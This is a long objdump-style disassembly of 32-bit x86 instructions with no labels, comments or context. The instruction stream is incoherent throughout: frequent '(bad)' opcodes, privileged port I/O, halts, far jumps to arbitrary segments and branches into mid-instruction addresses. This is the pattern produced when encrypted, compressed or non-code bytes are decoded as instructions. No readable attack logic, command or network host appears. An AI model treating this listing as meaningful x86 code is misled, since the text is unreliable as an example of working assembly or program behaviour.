  413be9:	imul   ebx,DWORD PTR [eax],0x6c09533
  413bef:	and    al,0x9a
  413bf1:	aaa    
  413bf2:	jl     0x413b9e
  413bf4:	dec    edx
  413bf5:	xchg   dl,bl
  413bf7:	inc    ebp
  413bf8:	jecxz  0x413c51
  413bfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413bfb:	adc    ebx,DWORD PTR [ebp-0x1e268361]
  413c01:	fdivr  QWORD PTR [esi]
  413c03:	jnp    0x413bb3
  413c05:	mov    ds:0xf168b4c0,eax
  413c0a:	call   0x6b009485
  413c0f:	mov    ah,0x8
  413c11:	dec    esi
  413c12:	xor    eax,0xd0cac20f
  413c17:	jl     0x413c31
  413c19:	(bad)  
  413c1a:	imul   ebx,DWORD PTR [esi-0x37],0x6f
  413c1e:	std    
  413c1f:	fadd   DWORD PTR es:[edi-0x4b1b21e9]
  413c26:	gs test eax,0x960c84bd
  413c2c:	pop    ebx
  413c2d:	adc    eax,0x93a01d03
  413c32:	(bad)  
  413c33:	xlat   BYTE PTR ds:[ebx]
  413c34:	sbb    dl,BYTE PTR [eax]
  413c36:	xchg   ebx,eax
  413c37:	jmp    0x6f3f:0xc7094a98
  413c3e:	stc    
  413c3f:	adc    BYTE PTR [eax-0x74e31b4a],cl
  413c45:	sbb    BYTE PTR [esi],ch
  413c47:	add    eax,0xf4ab74fd
  413c4c:	mov    al,0x16
  413c4e:	adc    eax,0x5cd2a606
  413c53:	std    
  413c54:	cmp    eax,0x14115814
  413c59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c5a:	loop   0x413c8a
  413c5c:	xchg   ebp,eax
  413c5d:	je     0x413c13
  413c5f:	ret    
  413c60:	jge    0x413cdd
  413c62:	xchg   esp,eax
  413c63:	jmp    0x879a:0xd0f915a9
  413c6a:	mov    WORD PTR [edx],gs
  413c6c:	nop
  413c6d:	mov    ebp,0x38a894d0
  413c72:	pushf  
  413c73:	xchg   edi,eax
  413c74:	mov    ebx,0x92d62184
  413c79:	add    al,0x4c
  413c7b:	ror    BYTE PTR [ebx+0x70],cl
  413c7e:	xor    BYTE PTR [eax+edi*4+0x69],ah
  413c82:	shl    DWORD PTR [ecx+0x13d48d57],cl
  413c88:	and    esi,DWORD PTR [esi]
  413c8a:	pop    esp
  413c8b:	sar    BYTE PTR [ebx],1
  413c8d:	(bad)  
  413c8e:	imul   BYTE PTR [edi-0x66ddaf0b]
  413c94:	jns    0x413c56
  413c96:	push   ebp
  413c97:	adc    esi,DWORD PTR [edi+0x22d482b1]
  413c9d:	pop    ss
  413c9e:	sub    edx,DWORD PTR [esi-0x21]
  413ca1:	xor    al,0x4c
  413ca3:	sti    
  413ca4:	iret   
  413ca5:	adc    al,0x5d
  413ca7:	(bad)  [edi]
  413ca9:	dec    edi
  413caa:	adc    eax,0x98622465
  413caf:	aas    
  413cb0:	xor    DWORD PTR [ebx],ecx
  413cb2:	(bad)  
  413cb3:	ds pop ebx
  413cb5:	arpl   WORD PTR [edx+0x7df6dc90],bp
  413cbb:	ret    0xa62d
  413cbe:	mov    edx,0x94b319c2
  413cc3:	hlt    
  413cc4:	sub    DWORD PTR [esi+0x26d9698c],ebp
  413cca:	add    eax,0x7f2d934e
  413ccf:	or     DWORD PTR [edx+edi*2],ebp
  413cd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413cd3:	add    DWORD PTR [ebx-0x7d],0xc0825274
  413cda:	popf   
  413cdb:	add    dh,ch
  413cdd:	lods   al,BYTE PTR ds:[esi]
  413cde:	add    BYTE PTR [ebx-0x19affff4],ah
  413ce4:	push   ss
  413ce5:	push   cs
  413ce6:	cwde   
  413ce7:	dec    esi
  413ce8:	cmp    eax,0x7aec75e0
  413ced:	sbb    cl,BYTE PTR [esi+esi*4+0x37]
  413cf1:	je     0x413c8e
  413cf3:	mov    edx,0x4d53e9a5
  413cf8:	hlt    
  413cf9:	mov    ah,0x6a
  413cfb:	sub    al,0x49
  413cfd:	xor    al,0x34
  413cff:	in     eax,dx
  413d00:	idiv   esp
  413d02:	pop    edx
  413d03:	mov    dl,0x30
  413d05:	dec    esi
  413d06:	adc    dh,cl
  413d08:	mov    BYTE PTR [ebx+ecx*2],cl
  413d0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d0c:	(bad)  
  413d0d:	imul   eax,DWORD PTR [edx+0x53],0x2bc1505a
  413d14:	push   eax
  413d15:	loop   0x413d15
  413d17:	fcom   QWORD PTR [eax+0x3f0eebe2]
  413d1d:	dec    esp
  413d1e:	jae    0x413d8d
  413d20:	ror    bl,0x8d
  413d23:	or     al,0x38
  413d25:	daa    
  413d26:	stos   DWORD PTR es:[edi],eax
  413d27:	clc    
  413d28:	sbb    eax,0x417d922c
  413d2d:	xchg   ebp,eax
  413d2e:	das    
  413d2f:	cld    
  413d30:	pop    ds
  413d31:	leave  
  413d32:	adc    bh,BYTE PTR [ebp+esi*8-0x18]
  413d36:	clc    
  413d37:	push   esp
  413d38:	daa    
  413d39:	clc    
  413d3a:	ret    
  413d3b:	lea    esp,[esi]
  413d3d:	in     eax,dx
  413d3e:	jne    0x413d60
  413d40:	adc    BYTE PTR [edi+0x3adab166],dl
  413d46:	mov    ebp,0xb8365228
  413d4b:	dec    edi
  413d4c:	add    BYTE PTR [ebp-0x50b17b91],ch
  413d52:	mov    ah,0x20
  413d54:	xor    BYTE PTR [eax-0x49f6dddd],ah
  413d5a:	push   esp
  413d5b:	je     0x413dc6
  413d5d:	mov    edx,0x37e2b88f
  413d62:	scas   al,BYTE PTR es:[edi]
  413d63:	xlat   BYTE PTR ss:[ebx]
  413d65:	jg     0x413de0
  413d67:	out    dx,eax
  413d68:	jnp    0x413de8
  413d6a:	es dec edx
  413d6c:	push   es
  413d6d:	dec    ecx
  413d6e:	xor    eax,0x22001e12
  413d73:	es push es
  413d75:	add    DWORD PTR [esi-0x778e94b],eax
  413d7b:	pop    ecx
  413d7c:	cld    
  413d7d:	pop    eax
  413d7e:	rcl    BYTE PTR [edi-0x7a15b013],0xe8
  413d85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d86:	cmp    ah,ch
  413d88:	jnp    0x413d21
  413d8a:	enter  0xd4c9,0x86
  413d8e:	cmp    DWORD PTR [edx+0xa1b83cd],ebp
  413d94:	fisttp DWORD PTR [ebx]
  413d96:	repnz dec edi
  413d98:	xchg   ebx,eax
  413d99:	iret   
  413d9a:	mov    edi,0xebd89723
  413d9f:	inc    ebx
  413da0:	and    edx,ecx
  413da2:	cmpxchg eax,edx
  413da5:	test   DWORD PTR [ebx-0x51],esi
  413da8:	add    bl,BYTE PTR [ebp+0x3d]
  413dab:	jle    0x413dca
  413dad:	jb     0x413e2a
  413daf:	sub    cl,0x3a
  413db2:	mov    al,0x6e
  413db4:	sbb    eax,DWORD PTR [eax]
  413db6:	fild   QWORD PTR [edx-0x4b]
  413db9:	scas   al,BYTE PTR es:[edi]
  413dba:	xor    al,0x92
  413dbc:	inc    BYTE PTR [ebx+0x32b1e183]
  413dc2:	or     al,0x94
  413dc4:	fldcw  WORD PTR [ebp-0x5f62aa64]
  413dca:	loop   0x413e25
  413dcc:	stos   DWORD PTR es:[edi],eax
  413dcd:	js     0x413db4
  413dcf:	test   al,0x67
  413dd1:	aam    0xa0
  413dd3:	out    dx,al
  413dd4:	ss or  bl,bh
  413dd7:	cmc    
  413dd8:	pop    ss
  413dd9:	jge    0x413dc3
  413ddb:	std    
  413ddc:	and    al,0x61
  413dde:	ja     0x413df5
  413de0:	inc    edi
  413de1:	mov    ch,0xa5
  413de3:	or     ecx,0x5
  413de6:	sbb    dl,BYTE PTR [ecx-0x66]
  413de9:	or     esp,ebp
  413deb:	ins    DWORD PTR es:[edi],dx
  413dec:	cs mov esi,0x3b504d80
  413df2:	and    ebp,ebp
  413df4:	cmp    bh,ch
  413df6:	xchg   edi,eax
  413df7:	and    eax,0x23cb1d6d
  413dfc:	add    al,0x93
  413dfe:	cmc    
  413dff:	push   ds
  413e00:	jl     0x413e14
  413e02:	cmp    esi,DWORD PTR [esi]
  413e04:	shl    DWORD PTR [ebp+0x6b],0xf4
  413e08:	pusha  
  413e09:	mov    BYTE PTR [edi-0x7831d404],cl
  413e0f:	in     eax,0xb2
  413e11:	adc    ebp,edx
  413e13:	fld    QWORD PTR [esi]
  413e15:	xchg   edi,eax
  413e16:	cdq    
  413e17:	push   edi
  413e18:	mov    dl,dl
  413e1a:	lods   eax,DWORD PTR ds:[esi]
  413e1b:	lahf   
  413e1c:	sbb    eax,0x746c1f91
  413e21:	into   
  413e22:	xor    DWORD PTR [edi],0x33
  413e25:	push   0x85b6de57
  413e2a:	adc    ebp,0xc3151df1
  413e30:	xchg   esi,eax
  413e31:	idiv   BYTE PTR [edx+esi*4+0x3e]
  413e35:	or     BYTE PTR ds:0xc3cb7be8,bh
  413e3b:	dec    ebp
  413e3c:	jne    0x413e99
  413e3e:	jge    0x413e98
  413e40:	mov    al,ds:0x861d5de7
  413e45:	jno    0x413e21
  413e47:	scas   eax,DWORD PTR es:[edi]
  413e48:	cwde   
  413e49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e4a:	loop   0x413e17
  413e4c:	push   esp
  413e4d:	sub    BYTE PTR [eax-0x58],ah
  413e50:	lods   al,BYTE PTR ds:[esi]
  413e51:	and    al,0xc6
  413e53:	pop    esp
  413e54:	push   DWORD PTR [edx-0x36001f92]
  413e5a:	bound  esi,QWORD PTR [esi-0x4a]
  413e5d:	pop    esp
  413e5e:	retf   
  413e5f:	out    0xe5,eax
  413e61:	out    dx,eax
  413e62:	mov    ebx,0x7577e1fe
  413e67:	cmc    
  413e68:	pop    edx
  413e69:	pop    edx
  413e6a:	sbb    DWORD PTR [edi],0x417e51bd
  413e70:	push   esp
  413e71:	shr    ebp,1
  413e73:	jnp    0x413ef2
  413e75:	idiv   DWORD PTR [esp+ebp*2+0x17]
  413e79:	cmp    eax,0x47afcf80
  413e7e:	cmp    BYTE PTR [edi],ah
  413e80:	cmp    DWORD PTR [edx+ecx*1+0x5b],esi
  413e84:	enter  0x5a4,0x5b
  413e88:	mov    al,0xca
  413e8a:	ins    DWORD PTR es:[edi],dx
  413e8b:	mov    al,0x16
  413e8d:	mov    eax,DWORD PTR [eax-0x39f1f763]
  413e93:	fsubr  QWORD PTR [ecx+0x59ec4476]
  413e99:	aas    
  413e9a:	mul    DWORD PTR [ebp+0x41819149]
  413ea0:	ds les ecx,FWORD PTR es:[ebp+0x44]
  413ea5:	mov    fs,WORD PTR [ebx+0x37]
  413ea8:	pop    ecx
  413ea9:	(bad)  
  413eaa:	addr16 call 0xb36bbc07
  413eb0:	push   ebx
  413eb1:	push   ecx
  413eb2:	jne    0x413e43
  413eb4:	push   cs
  413eb5:	cmp    DWORD PTR [ecx+ebp*1],ecx
  413eb8:	and    DWORD PTR [esi+0x1264b37c],ecx
  413ebe:	pusha  
  413ebf:	and    eax,0xea66d4bc
  413ec4:	out    0xb0,al
  413ec6:	in     al,0x59
  413ec8:	sti    
  413ec9:	stos   DWORD PTR es:[edi],eax
  413eca:	je     0x413e4c
  413ecc:	aas    
  413ecd:	sub    al,0x23
  413ecf:	ret    0x6d29
  413ed2:	inc    edx
  413ed3:	push   cs
  413ed4:	lods   al,BYTE PTR ds:[esi]
  413ed5:	sub    BYTE PTR [eax],cl
  413ed7:	pop    ebx
  413ed8:	mov    dl,0xb
  413eda:	jmp    0x413e67
  413edc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413edd:	into   
  413ede:	mov    al,0x97
  413ee0:	or     BYTE PTR [eax+ebp*4-0x72e33ef2],0x11
  413ee8:	xor    bl,BYTE PTR [ecx+0x5f8088fc]
  413eee:	aas    
  413eef:	lods   eax,DWORD PTR ds:[esi]
  413ef0:	sbb    al,0x9c
  413ef2:	pop    esi
  413ef3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ef4:	int3   
  413ef5:	cmp    ebp,DWORD PTR [edx-0x604637fe]
  413efb:	ins    BYTE PTR es:[edi],dx
  413efc:	lea    esi,[esi+0x343e9091]
  413f02:	jg     0x413f42
  413f04:	sbb    ebx,DWORD PTR [ebx-0x16]
  413f07:	ret    
  413f08:	shl    DWORD PTR [eax],1
  413f0a:	sub    DWORD PTR [edx-0x5deb65b9],0x64
  413f11:	pop    ecx
  413f12:	mov    ds:0x33939c7c,eax
  413f17:	inc    esp
  413f18:	jl     0x413f4e
  413f1a:	xor    dh,BYTE PTR [ebx]
  413f1c:	adc    edi,ebp
  413f1e:	sub    BYTE PTR [ecx+ebx*4],dh
  413f21:	sbb    esi,DWORD PTR [ebx+eax*2-0x38501941]
  413f28:	push   ds
  413f29:	pop    ss
  413f2a:	push   edi
  413f2b:	push   ebx
  413f2c:	pop    es
  413f2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f2e:	int    0xf1
  413f30:	push   edi
  413f31:	xor    dl,BYTE PTR [edi+0x15]
  413f34:	out    0x16,eax
  413f36:	mov    edi,0xddba30ee
  413f3b:	loop   0x413ee8
  413f3d:	pop    edi
  413f3e:	add    al,0x6e
  413f40:	repz pop eax
  413f42:	or     eax,0x972356b7
  413f47:	sbb    dl,BYTE PTR [edx+0x42d99878]
  413f4d:	popf   
  413f4e:	mov    bl,0x5d
  413f50:	cmc    
  413f51:	add    al,0xfe
  413f53:	mov    bh,0x55
  413f55:	adc    BYTE PTR [edi+0x31],0x7f
  413f59:	out    0x65,al
  413f5b:	or     esi,DWORD PTR [ecx]
  413f5d:	mov    ah,0xf9
  413f5f:	les    eax,FWORD PTR [esi]
  413f61:	xchg   ecx,eax
  413f62:	and    DWORD PTR ds:0x92f0053f,0x6d3e0e7d
  413f6c:	inc    ecx
  413f6d:	in     eax,0xb7
  413f6f:	lds    ebp,FWORD PTR [ecx+0x1b157361]
  413f75:	fst    QWORD PTR [eax+0x1086d508]
  413f7b:	xchg   edi,eax
  413f7c:	or     edx,esp
  413f7e:	lds    ebp,FWORD PTR [edi-0x7f]
  413f81:	jg     0x413f17
  413f83:	adc    BYTE PTR [ecx-0x47],dl
  413f86:	mov    dh,0x96
  413f88:	cld    
  413f89:	push   cs
  413f8a:	pop    ebp
  413f8b:	inc    eax
  413f8c:	add    DWORD PTR [edi-0xd],ebx
  413f8f:	out    0xcb,eax
  413f91:	dec    esp
  413f92:	lea    esp,[ecx+0x25]
  413f95:	dec    eax
  413f96:	mov    eax,ds:0x63f40e30
  413f9b:	in     al,dx
  413f9c:	ins    BYTE PTR es:[edi],dx
  413f9d:	mov    esi,0xb6717d82
  413fa2:	pop    esp
  413fa3:	ja     0x413f31
  413fa5:	imul   ecx,DWORD PTR [ecx+eax*2+0x1],0xffffffb6
  413faa:	xchg   ecx,eax
  413fab:	lds    ebp,FWORD PTR [edx-0x40852718]
  413fb1:	and    dh,BYTE PTR [ebx+eax*1+0x164e19c3]
  413fb8:	mov    ah,BYTE PTR [eax+0x4b29fd9f]
  413fbe:	push   eax
  413fbf:	mov    esi,0x959c2e68
  413fc4:	lahf   
  413fc5:	sar    DWORD PTR [edx-0x35],cl
  413fc8:	and    ecx,DWORD PTR [esi]
  413fca:	push   ds
  413fcb:	or     al,0x28
  413fcd:	addr16 mov cl,0xb0
  413fd0:	sbb    edx,DWORD PTR [edi+0x2d]
  413fd3:	cmp    dl,BYTE PTR [edx-0x49]
  413fd6:	imul   esp,DWORD PTR [ebp+0x19],0xfffffffe
  413fda:	popf   
  413fdb:	ficomp WORD PTR [ecx-0x1e]
  413fde:	jne    0x413fc1
  413fe0:	pop    esp
  413fe1:	pop    esp
  413fe2:	mov    BYTE PTR [eax+eax*1],ch
  413fe5:	dec    esp
  413fe6:	shr    DWORD PTR [eax-0x31],cl
  413fe9:	and    bh,BYTE PTR [edx+0x47]
  413fec:	into   
  413fed:	sbb    ecx,ebx
  413fef:	add    dh,dl
  413ff1:	(bad)  
  413ff2:	retf   
  413ff3:	loope  0x414045
  413ff5:	stos   BYTE PTR es:[edi],al
  413ff6:	std    
  413ff7:	cmc    
  413ff8:	int    0xd0
  413ffa:	mov    cs,esi
  413ffc:	pop    ecx
  413ffd:	ds in  al,0xa5
  414000:	call   0x267e:0x4647aaa0
  414007:	pop    es
  414008:	cmp    edi,DWORD PTR [ebx+eax*8]
  41400b:	dec    edx
  41400c:	test   BYTE PTR [ecx-0x1b],dh
  41400f:	lahf   
  414010:	loopne 0x413fc5
  414012:	xor    BYTE PTR [ebx],cl
  414014:	push   0x1a3c29d4
  414019:	xlat   BYTE PTR ds:[ebx]
  41401a:	push   es
  41401b:	call   0xb3659f24
  414020:	call   0xaabc3c6c
  414025:	xlat   BYTE PTR ds:[ebx]
  414026:	aad    0x60
  414028:	test   eax,0x1f68dc97
  41402d:	mov    eax,ds:0xcfe0a243
  414032:	pop    ss
  414033:	stc    
  414034:	lock add BYTE PTR [edi+esi*1-0x58],0xc8
  41403a:	int    0x65
  41403c:	cmp    dl,BYTE PTR ds:0xca95a7a2
  414042:	mov    dh,0xb3
  414044:	mov    ch,0x4c
  414046:	inc    esi
  414047:	and    DWORD PTR [edx],esp
  414049:	jo     0x413fe3
  41404b:	rol    DWORD PTR [eax],1
  41404d:	leave  
  41404e:	mov    dh,0xc1
  414050:	(bad)  
  414051:	sub    dh,BYTE PTR [ebp*8+0x3afd8475]
  414058:	inc    esi
  414059:	bound  ebx,QWORD PTR [eax-0x2f]
  41405c:	mov    eax,ds:0x3fdc7516
  414061:	jns    0x41404a
  414063:	loope  0x4140ab
  414065:	retf   0x54c
  414068:	adc    DWORD PTR [ecx-0x2fccb84b],0x5d
  41406f:	test   DWORD PTR [eax-0x42ce9cb4],ebp
  414075:	std    
  414076:	sub    eax,0xaf704f68
  41407b:	and    BYTE PTR [edx],al
  41407d:	push   ss
  41407e:	pusha  
  41407f:	mov    ebp,DWORD PTR [esi]
  414081:	pop    es
  414082:	imul   ebp,DWORD PTR [edi+0x7a],0x43
  414086:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414087:	test   eax,0xc7dc2354
  41408c:	out    dx,eax
  41408d:	fidivr WORD PTR [eax-0x33ea09d9]
  414093:	jae    0x414022
  414095:	pop    edx
  414096:	add    dl,BYTE PTR [ecx]
  414098:	mov    ds:0x6f24cc79,eax
  41409d:	mov    al,dl
  41409f:	jae    0x41403a
  4140a1:	and    cl,ch
  4140a3:	jmp    0x200d:0x663ce44
  4140aa:	loope  0x414103
  4140ac:	scas   eax,DWORD PTR es:[edi]
  4140ad:	loopne 0x4140aa
  4140af:	xor    DWORD PTR [eax+0x14],0x634daaea
  4140b6:	cli    
  4140b7:	push   ss
  4140b8:	and    eax,0x79056483
  4140bd:	loop   0x41412c
  4140bf:	sub    DWORD PTR [eax],ebp
  4140c1:	pop    ecx
  4140c2:	stos   DWORD PTR es:[edi],eax
  4140c3:	or     DWORD PTR [ebx+0x66],esp
  4140c6:	push   es
  4140c7:	popa   
  4140c8:	cwde   
  4140c9:	(bad)  
  4140ca:	loop   0x4140ca
  4140cc:	inc    edi
  4140cd:	outs   dx,DWORD PTR ds:[esi]
  4140ce:	adc    BYTE PTR [ecx+0x18344486],dh
  4140d4:	sub    ebx,DWORD PTR [ebx+edx*1+0x715bd3d]
  4140db:	cmp    ch,bh
  4140dd:	call   DWORD PTR [esi]
  4140df:	jno    0x4140bd
  4140e1:	jmp    0x41412b
  4140e3:	popa   
  4140e4:	sub    bl,BYTE PTR [eax+0x5d98d1fa]
  4140ea:	enter  0xd403,0x30
  4140ee:	push   ds
  4140ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4140f0:	lods   al,BYTE PTR ds:[esi]
  4140f1:	dec    ecx
  4140f3:	fnstenv [edx]
  4140f5:	cwde   
  4140f6:	xchg   ecx,eax
  4140f7:	dec    eax
  4140f8:	repz clc 
  4140fa:	mov    dh,0x91
  4140fc:	push   ecx
  4140fd:	and    BYTE PTR [ebp-0x35372d30],bl
  414103:	mov    eax,0x20e82d8f
  414108:	mov    al,ds:0x34747dea
  41410d:	add    edx,ebx
  41410f:	icebp  
  414110:	xor    DWORD PTR [esi],edx
  414112:	pop    ebp
  414113:	data16 fstp QWORD PTR [esi-0x4291ecd0]
  41411a:	scas   al,BYTE PTR es:[edi]
  41411b:	lods   al,BYTE PTR ds:[esi]
  41411c:	inc    edx
  41411d:	and    eax,0x8e2d7b11
  414122:	mov    dl,0xd0
  414124:	cmc    
  414125:	repnz mov es,ebx
  414128:	xor    DWORD PTR [ebp+ecx*4+0x52],0x58
  41412d:	mov    eax,ds:0xf483caee
  414132:	idiv   DWORD PTR [eax+0x72e814ca]
  414138:	in     eax,0x3f
  41413a:	push   DWORD PTR [ebp-0x49]
  41413d:	xchg   esp,eax
  41413e:	push   ds
  41413f:	imul   edi,DWORD PTR [edi],0x95cb0bba
  414145:	leave  
  414146:	test   al,0xd3
  414148:	mov    edx,0x153234a3
  41414d:	dec    ebx
  41414e:	jg     0x41418b
  414150:	mov    dh,0xc1
  414152:	iret   
  414153:	mov    WORD PTR ss:[ebx-0x69],gs
  414157:	ret    0xd716
  41415a:	push   ecx
  41415b:	xor    ecx,DWORD PTR [edx+0x13ceadc9]
  414161:	mov    eax,0xb1fbad5a
  414166:	xlat   BYTE PTR ds:[ebx]
  414167:	rcr    ebp,cl
  414169:	ror    ebx,cl
  41416b:	mov    ebp,0x4ee94660
  414170:	and    esi,esi
  414172:	or     eax,0x207d0e8b
  414177:	and    DWORD PTR [si],eax
  41417a:	js     0x414154
  41417c:	and    eax,0xf7e7c6df
  414181:	mov    ecx,0x9ce04d7c
  414186:	mov    DWORD PTR [eax],ecx
  414188:	pop    ecx
  414189:	aaa    
  41418a:	mov    ebp,0xe3abafa0
  41418f:	test   BYTE PTR [eax-0x22c7d71b],bh
  414195:	mov    edi,0xdbb0fe15
  41419a:	retf   
  41419b:	rcr    DWORD PTR [eax],1
  41419d:	push   esi
  41419e:	push   esi
  41419f:	mov    ch,al
  4141a1:	jbe    0x41416a
  4141a3:	add    eax,0x9653f02a
  4141a8:	or     al,0xe3
  4141aa:	dec    ebp
  4141ab:	(bad)  
  4141ac:	fld    QWORD PTR [esi-0x3e4e80d6]
  4141b2:	mov    eax,ds:0x35632fd5
  4141b7:	pop    es
  4141b8:	push   edi
  4141b9:	add    al,0xd8
  4141bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141bc:	fwait
  4141bd:	inc    esi
  4141be:	js     0x41415a
  4141c0:	and    bl,0x7d
  4141c3:	es mov ecx,0x45da1329
  4141c9:	repz pop esp
  4141cb:	xor    ebx,DWORD PTR [ecx+0x72]
  4141ce:	dec    esi
  4141cf:	mov    al,0x87
  4141d1:	xchg   edx,eax
  4141d2:	jb     0x4141b7
  4141d4:	ror    BYTE PTR [esi-0x45],cl
  4141d7:	(bad)  [esi-0x4ffafb09]
  4141dd:	jo     0x41423a
  4141df:	out    dx,al
  4141e0:	sub    ebx,ebx
  4141e2:	pop    ebp
  4141e3:	fadd   st,st(5)
  4141e5:	and    eax,0xa3396557
  4141ea:	jb     0x41417d
  4141ec:	rcr    DWORD PTR [ebp+0xc],cl
  4141ef:	xchg   esi,eax
  4141f0:	mov    eax,ds:0xc6012254
  4141f5:	push   0xeb468ef3
  4141fa:	pop    edi
  4141fb:	fimul  DWORD PTR [ebp-0x25781d7b]
  414201:	xor    ebp,DWORD PTR [esi+0x77d23c4c]
  414207:	xlat   BYTE PTR ds:[ebx]
  414208:	fucom  st(2)
  41420a:	push   esp
  41420b:	and    al,0x3d
  41420d:	fiadd  DWORD PTR [edx]
  41420f:	das    
  414210:	jnp    0x4141b3
  414212:	inc    edi
  414213:	cmc    
  414214:	push   ebx
  414215:	into   
  414216:	mov    bh,0x29
  414218:	out    dx,al
  414219:	fld    QWORD PTR [edx-0x41ad87b5]
  41421f:	fisubr DWORD PTR [ebx-0x1c040722]
  414225:	ror    DWORD PTR [eax-0x2b],cl
  414228:	mov    edi,0x4a889e29
  41422d:	add    ebp,edi
  41422f:	or     eax,0x6f6a3f2f
  414234:	out    0x66,al
  414236:	ss out 0x45,eax
  414239:	adc    DWORD PTR [bp+si+0x10],esi
  41423d:	mov    cs,WORD PTR [ebx+0x6]
  414240:	add    edi,ebp
  414242:	push   ss
  414243:	imul   esp,DWORD PTR [ebp-0x1d],0xffffffc4
  414247:	loop   0x41421e
  414249:	mov    bl,BYTE PTR [eax]
  41424b:	sahf   
  41424c:	xchg   DWORD PTR [edx-0x1a9931a5],eax
  414252:	pop    ds
  414253:	jnp    0x41424e
  414255:	jl     0x414246
  414257:	cmp    al,0x72
  414259:	adc    al,0xc1
  41425b:	cld    
  41425c:	sbb    DWORD PTR [eax+0x4d7549dd],ecx
  414262:	es loope 0x41424b
  414265:	(bad)  
  414266:	(bad)  [esi-0x7]
  414269:	cmp    eax,0xe42cecce
  41426e:	scas   eax,DWORD PTR es:[edi]
  41426f:	mov    esp,0x4c6c488a
  414274:	pushf  
  414275:	jae    0x414293
  414277:	pop    edx
  414278:	adc    eax,DWORD PTR [esi]
  41427a:	imul   esi,DWORD PTR [ecx+0x35782831],0xb32ab64
  414284:	loopne 0x4142c2
  414286:	pop    ebx
  414287:	or     al,0x16
  414289:	sbb    dh,dh
  41428b:	sbb    BYTE PTR [ebp+0x4c],al
  41428e:	fcomp  DWORD PTR [edi+0x2b]
  414291:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414292:	inc    ecx
  414293:	aad    0x90
  414295:	sub    DWORD PTR [edi-0x4922e3bb],0x92dff997
  41429f:	mov    eax,0xe0e6e660
  4142a4:	push   cs
  4142a5:	jl     0x41427c
  4142a7:	inc    ebp
  4142a8:	gs jg  0x414315
  4142ab:	sub    bh,al
  4142ad:	push   esp
  4142ae:	addr16 mov ds:0x14ed,eax
  4142b2:	ret    
  4142b3:	in     eax,0xf2
  4142b5:	mov    ds:0x9add745b,al
  4142ba:	or     esp,DWORD PTR [edi+ebx*2-0x767cba1d]
  4142c1:	adc    dl,BYTE PTR [ecx+0x1c147855]
  4142c7:	xchg   esp,eax
  4142c8:	inc    ecx
  4142c9:	push   cs
  4142ca:	mov    edx,0x9d4fc8fd
  4142cf:	pand   mm0,QWORD PTR [esi-0x21a9196d]
  4142d6:	nop
  4142d7:	push   0x67
  4142d9:	into   
  4142da:	stc    
  4142db:	call   0x1f06:0x78e38910
  4142e2:	push   ebx
  4142e3:	jno    0x414266
  4142e5:	mov    bl,0x41
  4142e7:	xchg   edx,eax
  4142e8:	pop    ecx
  4142e9:	mov    bl,0x86
  4142eb:	add    cl,ah
  4142ed:	or     eax,esp
  4142ef:	mov    ecx,DWORD PTR [esi-0x7d]
  4142f2:	imul   esp,DWORD PTR [edi+0x1e5e5bc6],0xed06c7e7
  4142fc:	inc    esi
  4142fd:	mov    esp,0x1ab3fe6d
  414302:	cmp    DWORD PTR ds:0x2a5f8d44,0xacffe092
  41430c:	sub    bh,BYTE PTR [edi]
  41430e:	mov    al,ds:0xcf086127
  414313:	add    ecx,ecx
  414315:	jne    0x4142ce
  414317:	lods   eax,DWORD PTR ds:[esi]
  414318:	scas   al,BYTE PTR es:[edi]
  414319:	not    ch
  41431b:	xor    BYTE PTR ds:0xd47e971a,al
  414321:	int    0x69
  414323:	adc    esi,DWORD PTR [ebp-0x76201ea]
  414329:	or     al,0xba
  41432b:	push   0x34591c6a
  414330:	outs   dx,DWORD PTR ds:[esi]
  414331:	jl     0x41430d
  414333:	iret   
  414334:	sar    dl,cl
  414336:	adc    al,0xb2
  414338:	jne    0x41433f
  41433a:	sbb    eax,0xbbfec915
  41433f:	jne    0x414343
  414341:	mov    eax,ds:0x2ddd153d
  414346:	(bad)  
  414347:	mul    DWORD PTR [ecx-0x1b4e9de2]
  41434d:	imul   esi,DWORD PTR [edi+0x79fa3c6b],0x75
  414354:	dec    edi
  414355:	(bad)  
  414356:	or     DWORD PTR [ebx-0x26],ebp
  414359:	xchg   esi,eax
  41435a:	fwait
  41435b:	test   eax,0x8d70429e
  414360:	push   cs
  414361:	ds pop edx
  414363:	dec    eax
  414364:	rcr    BYTE PTR [ebp+0x26dbf079],0x8e
  41436b:	in     eax,dx
  41436c:	and    al,0xfb
  41436e:	clc    
  41436f:	loop   0x4143d8
  414371:	addr16 mov cs:0xd301,eax
  414376:	int    0xd5
  414378:	hlt    
  414379:	fsub   DWORD PTR ds:0x296e0775
  41437f:	int    0x39
  414381:	mov    esi,0x5a7a0697
  414386:	mov    esi,0x231cfee1
  41438b:	ins    DWORD PTR es:[edi],dx
  41438c:	lock aad 0xc8
  41438f:	push   DWORD PTR [ecx+0x47d4b1cd]
  414395:	cdq    
  414396:	addr16 pop ebp
  414398:	test   esp,0x4226d2f7
  41439e:	jg     0x414344
  4143a0:	ds mov esi,0x5e128b38
  4143a6:	mov    dh,0xca
  4143a8:	sub    eax,0xea8fd909
  4143ad:	and    al,0x6f
  4143af:	test   DWORD PTR [edx+0x56],ecx
  4143b2:	push   ds
  4143b3:	mov    eax,0x3245b78e
  4143b8:	xor    edi,0xffffffc7
  4143bb:	adc    esi,DWORD PTR [ecx]
  4143bd:	xchg   ecx,eax
  4143be:	sbb    al,0x7e
  4143c0:	or     edi,0x9fedd48c
  4143c6:	lea    ebx,[edx]
  4143c8:	mov    esp,DWORD PTR ds:0xd4855b0d
  4143ce:	call   0xbfb1b7eb
  4143d3:	push   eax
  4143d4:	mov    al,0xb0
  4143d6:	(bad)  
  4143d7:	sbb    eax,0x453632c7
  4143dc:	ss jge 0x414447
  4143df:	in     al,dx
  4143e0:	xlat   BYTE PTR ds:[ebx]
